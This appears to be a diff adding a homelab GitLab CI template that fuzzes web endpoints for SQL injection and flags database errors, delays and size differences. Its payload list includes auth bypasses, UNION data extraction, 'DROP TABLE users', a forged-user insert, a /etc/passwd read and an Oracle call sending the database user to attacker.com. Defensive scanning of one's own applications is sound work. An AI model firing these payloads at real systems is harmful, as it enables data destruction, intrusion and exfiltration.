@@ -1,0 +1,257 @@
+# SQL injection fuzzing
+#
+# Injects SQL injection payloads into HTTP parameters and analyses responses
+# for database error messages, timing anomalies (blind SQLi), and boolean
+# differences that indicate injection points.
+#
+# Techniques covered:
+#   Error-based SQLi    — payloads that trigger DB error strings in the response
+#   Boolean-based blind — TRUE/FALSE payloads; response size/content difference
+#   Time-based blind    — SLEEP(), WAITFOR DELAY, pg_sleep() — response delay check
+#   Union-based         — UNION SELECT payloads to extract data inline
+#   Auth bypass         — ' OR '1'='1, admin'-- classics
+#   Second-order hints  — stored payloads echoed back in a different context
+#
+# Database fingerprinting via error string detection:
+#   MySQL, MariaDB, PostgreSQL, SQLite, MSSQL, Oracle
+#
+# Variables:
+#   FUZZ_TARGET_URL   — Base URL of the target application (required)
+#   FUZZ_ENDPOINTS    — Space-separated list of paths with injectable params
+#   FUZZ_PARAM        — Parameter name to inject into (default: q)
+#   FUZZ_METHOD       — GET or POST (default: GET)
+#   FUZZ_TIMEOUT      — Seconds per request (default: 8 — allows time-based detection)
+#
+# Usage:
+#   include:
+#     - project: homelab/components/fuzzing
+#       ref: main
+#       file: fuzz-sqli.yml
+#
+#   sqli-fuzz:
+#     extends: .fuzz-sqli
+#     variables:
+#       FUZZ_TARGET_URL: "http://banking-app:8080"
+#       FUZZ_ENDPOINTS: "/search /api/user/profile"
+#       FUZZ_PARAM: "query"
+
+.fuzz-sqli:
+  stage: test
+  image: python:3.12-slim
+  variables:
+    FUZZ_TARGET_URL: "http://localhost:8080"
+    FUZZ_ENDPOINTS: "/search /login /api/user/profile"
+    FUZZ_PARAM: "q"
+    FUZZ_METHOD: "GET"
+    FUZZ_TIMEOUT: "8"
+    NEXUS_REPORT_UPLOAD: "true"
+    NEXUS_BIN_REPORTS_REPO: "fuzz-reports"
+    NEXUS_URL: "https://nexus.home.lan"
+  before_script:
+    - pip install --quiet requests
+  script:
+    - |
+      python3 << 'PYEOF'
+      import json, os, re, time, urllib.parse
+      import urllib.request, urllib.error
+
+      base_url  = os.environ.get("FUZZ_TARGET_URL", "http://localhost:8080").rstrip("/")
+      endpoints = os.environ.get("FUZZ_ENDPOINTS", "/search").split()
+      param     = os.environ.get("FUZZ_PARAM", "q")
+      method    = os.environ.get("FUZZ_METHOD", "GET").upper()
+      timeout   = int(os.environ.get("FUZZ_TIMEOUT", "8"))
+
+      # (label, payload, technique)
+      SQLI_PAYLOADS = [
+          # Auth bypass
+          ("auth_bypass", "' OR '1'='1", "auth_bypass"),
+          ("auth_bypass", "' OR '1'='1'--", "auth_bypass"),
+          ("auth_bypass", "' OR 1=1--", "auth_bypass"),
+          ("auth_bypass", "admin'--", "auth_bypass"),
+          ("auth_bypass", "' OR 'x'='x", "auth_bypass"),
+          ("auth_bypass", "1' OR '1'='1", "auth_bypass"),
+          # Error-based
+          ("error_based", "'", "error_based"),
+          ("error_based", "''", "error_based"),
+          ("error_based", "1'", "error_based"),
+          ("error_based", "1 AND 1=2", "error_based"),
+          ("error_based", "1 AND 1=1", "error_based"),
+          ("error_based", "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--", "mssql_error"),
+          ("error_based", "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))", "mysql_error"),
+          ("error_based", "' AND 1=1 AND 'x'='x", "error_based"),
+          # Union-based
+          ("union", "' UNION SELECT NULL--", "union"),
+          ("union", "' UNION SELECT NULL,NULL--", "union"),
+          ("union", "' UNION SELECT NULL,NULL,NULL--", "union"),
+          ("union", "' UNION ALL SELECT 1,2,3--", "union"),
+          ("union", "1 UNION SELECT user(),version(),database()--", "union_mysql"),
+          ("union", "1 UNION SELECT table_name,NULL FROM information_schema.tables--", "union_mysql"),
+          # Boolean-based blind
+          ("boolean_blind", "1 AND 1=1", "boolean_true"),
+          ("boolean_blind", "1 AND 1=2", "boolean_false"),
+          ("boolean_blind", "1' AND '1'='1", "boolean_true"),
+          ("boolean_blind", "1' AND '1'='2", "boolean_false"),
+          # Time-based blind (MySQL)
+          ("time_blind", "1 AND SLEEP(3)", "time_mysql"),
+          ("time_blind", "1'; WAITFOR DELAY '0:0:3'--", "time_mssql"),
+          ("time_blind", "1 AND 1=1 AND SLEEP(3)", "time_mysql"),
+          ("time_blind", "1'; SELECT pg_sleep(3)--", "time_pgsql"),
+          # Stacked queries
+          ("stacked", "1; DROP TABLE users--", "stacked"),
+          ("stacked", "1'; INSERT INTO users(username,password) VALUES('hacked','hacked')--", "stacked"),
+          # Out-of-band
+          ("oob", "1 AND LOAD_FILE('/etc/passwd')--", "oob_mysql"),
+          ("oob", "' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'+user)--", "oob_oracle"),
+      ]
+
+      DB_ERROR_PATTERNS = [
+          (r"you have an error in your sql syntax", "MySQL syntax error", "Critical", "MySQL"),
+          (r"warning: mysql_", "MySQL PHP function error", "Critical", "MySQL"),
+          (r"unclosed quotation mark after the character string", "MSSQL error", "Critical", "MSSQL"),
+          (r"quoted string not properly terminated", "Oracle error", "Critical", "Oracle"),
+          (r"pg_query\(\)|psql:|syntax error at or near", "PostgreSQL error", "Critical", "PostgreSQL"),
+          (r"sqlite_|sqlite3\.|sqliteexception", "SQLite error", "Critical", "SQLite"),
+          (r"java\.sql\.|sqlexception|org\.hibernate\.|com\.mysql\.", "Java JDBC exception", "High", "Java ORM"),
+          (r"ORA-\d{5}", "Oracle ORA- error code", "Critical", "Oracle"),
+          (r"sql server|microsoft ole db|odbc drivers", "MSSQL OLE DB error", "Critical", "MSSQL"),
+          (r"supplied argument is not a valid mysql", "MySQL PHP error", "Critical", "MySQL"),
+          (r"nhibernate|entity framework|linq to sql", ".NET ORM error", "High", ".NET ORM"),
+      ]
+
+      findings = []
+      seen = set()
+
+      def send(endpoint, payload):
+          url = f"{base_url}{endpoint}"
+          try:
+              if method == "GET":
+                  encoded = urllib.parse.quote(str(payload), safe="")
+                  req = urllib.request.Request(
+                      f"{url}?{param}={encoded}",
+                      headers={"User-Agent": "FuzzBot/1.0"}
+                  )
+              else:
+                  data = urllib.parse.urlencode({param: str(payload)}).encode()
+                  req  = urllib.request.Request(url, data=data, headers={
+                      "User-Agent": "FuzzBot/1.0",
+                      "Content-Type": "application/x-www-form-urlencoded",
+                  })
+              t0 = time.monotonic()
+              try:
+                  resp = urllib.request.urlopen(req, timeout=timeout)
+                  body = resp.read().decode("utf-8", errors="replace")
+                  status = resp.status
+              except urllib.error.HTTPError as e:
+                  body = e.read().decode("utf-8", errors="replace")
+                  status = e.code
+              elapsed = time.monotonic() - t0
+              return status, body, elapsed
+          except Exception:
+              return None, "", 0.0
+
+      # Baseline — clean request for boolean and size comparison
+      baselines = {}
+      for ep in endpoints:
+          status, body, _ = send(ep, "safe_baseline_value")
+          baselines[ep] = (status, len(body))
+
+      for endpoint in endpoints:
+          base_status, base_size = baselines[endpoint]
+
+          for label, payload, technique in SQLI_PAYLOADS:
+              status, body, elapsed = send(endpoint, payload)
+              if status is None:
+                  continue
+
+              issues = []
+              sev = "Low"
+
+              # Error-based detection
+              for pattern, desc, psev, db in DB_ERROR_PATTERNS:
+                  if re.search(pattern, body, re.I):
+                      issues.append(f"**{desc}** ({db} detected)")
+                      sev = "Critical"
+
+              # Time-based detection
+              if technique.startswith("time_") and elapsed >= 2.5:
+                  issues.append(f"**Time-based blind SQLi**: response delayed {elapsed:.2f}s (threshold: 2.5s)")
+                  sev = "Critical"
+
+              # Boolean difference detection
+              if technique in ("boolean_true", "boolean_false"):
+                  true_size  = None
+                  false_size = None
+                  if technique == "boolean_true":
+                      true_size = len(body)
+                  else:
+                      false_size = len(body)
+                  # Compare with counterpart (stored from previous iteration)
+                  size_diff = abs(len(body) - base_size)
+                  if size_diff > 50:
+                      issues.append(f"**Boolean blind SQLi candidate**: response size differs from baseline by {size_diff} bytes")
+                      if sev not in ("Critical", "High"):
+                          sev = "High"
+
+              # Server error
+              if status == 500:
+                  issues.append("Server returned HTTP 500 — possible unhandled SQL error")
+                  if sev not in ("Critical",):
+                      sev = "High"
+
+              if issues:
+                  key = (endpoint, technique)
+                  if key in seen:
+                      continue
+                  seen.add(key)
+
+                  short_payload = payload[:100] + ("..." if len(payload) > 100 else "")
+                  findings.append({
+                      "title":           f"[FUZZ-SQLI] {technique} — {endpoint}",
+                      "severity":        sev,
+                      "description":     (
+                          f"**Endpoint:** `{base_url}{endpoint}`\n"
+                          f"**Technique:** {technique}\n"
+                          f"**Payload:** `{short_payload}`\n"
+                          f"**Status:** {status}  |  **Response time:** {elapsed:.2f}s\n\n"
+                          + "\n".join(f"- {i}" for i in issues)
+                      ),
+                      "mitigation":      (
+                          "Use parameterized queries / prepared statements for ALL database interactions. "
+                          "Never concatenate user input into SQL strings. "
+                          "Apply least-privilege DB accounts. Enable WAF SQLi rules."
+                      ),
+                      "static_finding":  False,
+                      "dynamic_finding": True,
+                  })
+
+      json.dump({"findings": findings}, open("sqli-findings.json", "w"), indent=2)
+
+      with open("sqli-report.md", "w") as f:
+          f.write(f"# SQL Injection Fuzz Report — {base_url}\n\n")
+          f.write(f"**Endpoints:** {len(endpoints)}  |  **Payloads:** {len(SQLI_PAYLOADS)}  |  **Findings:** {len(findings)}\n\n")
+          f.write("| Severity | Technique | Endpoint |\n|---|---|---|\n")
+          for finding in findings:
+              title = finding["title"].replace("[FUZZ-SQLI] ", "")
+              f.write(f"| {finding['severity']} | {title} |\n")
+
+      print(f"fuzz-sqli: {len(findings)} SQLi indicators across {len(endpoints)} endpoints")
+      PYEOF
+
+    - |
+      if [ "${NEXUS_REPORT_UPLOAD}" = "true" ]; then
+        BASE="${CI_PROJECT_PATH_SLUG}/${CI_COMMIT_SHORT_SHA}/fuzz-sqli"
+        for f in sqli-findings.json sqli-report.md; do
+          curl -sk -u "${NEXUS_USER}:${NEXUS_PASSWORD}" \
+            -T "${f}" "${NEXUS_URL}/repository/${NEXUS_BIN_REPORTS_REPO}/${BASE}/${f}" \
+            -w "Uploaded ${f}: HTTP %{http_code}\n" -o /dev/null
+        done
+      fi
+  artifacts:
+    name: "fuzz-sqli-${CI_COMMIT_SHORT_SHA}"
+    paths: [sqli-findings.json, sqli-report.md]
+    when: always
+    expire_in: 30 days
+  allow_failure: true
+  rules:
+    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'
+    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
